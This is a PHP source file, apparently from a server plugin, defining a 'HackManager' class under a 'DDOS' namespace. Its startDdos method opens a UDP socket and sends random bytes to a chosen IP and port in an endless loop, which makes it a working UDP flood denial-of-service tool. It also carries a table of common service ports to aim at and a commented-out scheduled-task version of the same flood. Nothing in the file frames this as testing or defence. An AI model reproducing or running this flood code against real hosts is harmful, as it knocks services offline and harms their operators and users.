<?php

namespace DDOS\Utils;

use DDOS\Main;
use DDOS\Shedule\DdosTask;

class HackManager {

    /**
     * @var string
     */
    public string $ip;

    /**
     * @var string
     */
    public string $port;

    /**
     * @var array
     */
    public array $BYTES = [];

    /**
     * TODO a fix
     * @var string[]
     */
    public $port_list =  array(
        'reserved' =>  '0'    ,  'ftp'     =>  '21'   ,  'ssh'        =>  '22'  ,
        'telnet'   =>  '23'   ,  'smtp'    =>  '25'   ,  'dns'        =>  '53'  ,
        'http'     =>  '80'   ,  'pop3'    =>  '110'  ,  'imap'       =>  '143' ,
        'https'    =>  '443'  ,  'smtp/s'  =>  '465'  ,  'smtp/n'     =>  '587' ,
        'imap4'    =>  '993'  ,  'pop3/s'  =>  '995'  ,  'sql'        =>  '1433',
        'mysql'    =>  '3306' ,  'rdp'     =>  '3389' ,  'pc/anyware' =>  '5631'
    );

    /**
     * @var string
     */
    public string $reason;

    /**
     * __construct
     *
     * @param string $ip
     * @param string $port
     * @param string $reason
     */
    public function __construct(string $ip, string $port, string $reason) {
        $this->ip = $ip;
        $this->port = $port;
        $this->reason = $reason;
    }

    /**
     * @return string
     */
    public function getIp() : string {
        return $this->ip;
    }

    /**
     *
     * @return string
     */
    public function getPort() : string {
        return $this->port;
    }

    /**
     * @return string
     */
    public function getReason() : string {
        return $this->reason;
    }

    /**
     * @return array
     */
    public function getAdresse() : array {
        return [$this->getiP(), $this->getPort()];
    }

    /**
     * @return void
     */
    public function genBytes() : void {
        $hex  = substr(md5(mt_rand()), 0, 9);
        $this->BYTES[0] = unpack('H*', "$hex");
        $this->BYTES[1] = base_convert($this->BYTES[0][1], 16, 2);

    }

    /**
     * @return int
     */
    public function getBuffer() : int {
        return strlen($this->BYTES[1]);
    }

    /**
     * @param $ip
     * @return string|null
     */
    public function safe_input_ip($ip) : string|null {
        $ip = htmlspecialchars($ip);
        $ip = htmlentities($ip);
        $ip = trim($ip);
        $ip = stripslashes($ip);
        $ip = stripcslashes ($ip);

        if ($ip)
            return ($ip);

        else
            $trace = debug_backtrace();

        return null;

    }

    /**
     * @return void
     */
    public function startDdos() : void {
        /*if(($sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false)
            echo "ddos fail : " . socket_strerror(socket_last_error()) . "\n";

        else
            $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);*/

        $this->genBytes();
        $bytes = $this->BYTES[1];
        $buffer = $this->getBuffer();
        $flag = 0;
        $ip_addr = $this->getIp();
        $port = $this->getPort();


          /*if ($port == "0")
              $port = 0;

          else if ($port == "21")
              $port = $this->port_list['fpt'];

          else if ($port == "22")
              $port = $this->port_list['ssh'];

          else if ($port == "23")
              $port = $this->port_list['telnet'];

          else if ($port == "25")
              $port = $this->port_list['smtp'];

          else if ($port == "53")
              $port = $this->port_list['dns'];

          else if ($port == "80")
              $port = $this->port_list['http'];

          else if ($port == "110")
              $port = $this->port_list['pop3'];

          else if ($port == "143")
              $port = $this->port_list['imap'];

          else if ($port == "443")
              $port = $this->port_list['https'];

          else if ($port == "465")
              $port = $this->port_list['smtp/s'];

          else if ($port == "587")
              $port = $this->port_list['smtp/n'];

          else if ($port == "993")
              $port = $this->port_list['imap4'];

          else if ($port == "995")
              $port = $this->port_list['pop3/s'];

          else if ($port == "1433")
              $port = $this->port_list['sql'];

          else if ($port == "3306")
              $port = $this->port_list['mysql'];

          else if ($port == "3389")
              $port = $this->port_list['rdp'];

          else if ($port == "5631")
              $port = $this->port_list['pc/anyware'];*/
        $sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
        $ip_addr = $this->safe_input_ip($ip_addr);
        while(1) {
            socket_sendto($sock,$bytes, $buffer, $flag, $ip_addr, $port);
        }

    }
    /*

        $this->genBytes();
        $bytes = $this->BYTES[1];
        $buffer = $this->getBuffer();

        $sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);

        $task = new DdosTask($sock, $bytes, $buffer,0, $this->getIp(), $this->getPort());
        Main::getInstance()->getScheduler()->scheduleRepeatingTask($task, 1);
    }
*/
}

